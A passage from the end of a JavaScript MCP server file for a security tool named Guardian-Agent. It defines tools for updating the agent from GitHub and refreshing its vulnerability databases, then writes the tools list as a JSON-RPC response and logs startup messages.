                  description: 'Update Guardian-Agent to the latest version from GitHub',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      force: { type: 'boolean', description: 'Force update even with local changes' },
                      backup: { type: 'boolean', default: true, description: 'Backup files before updating' }
                    }
                  }
                },
                {
                  name: 'update_vuln_databases',
                  description: 'Update only the vulnerability databases (keeps checks current)',
                  inputSchema: { type: 'object', properties: {} }
                }
              ]
            }
          };
          process.stdout.write(JSON.stringify(response) + '\n');
        }

      } catch (err) {
        console.error('[Guardian] Parse error:', err.message);
      }
    }
  });

  console.error('[Guardian-Agent] MCP server started');
  console.error(`[Guardian-Agent] Project path: ${server.projectPath}`);
}

main().catch(console.error);
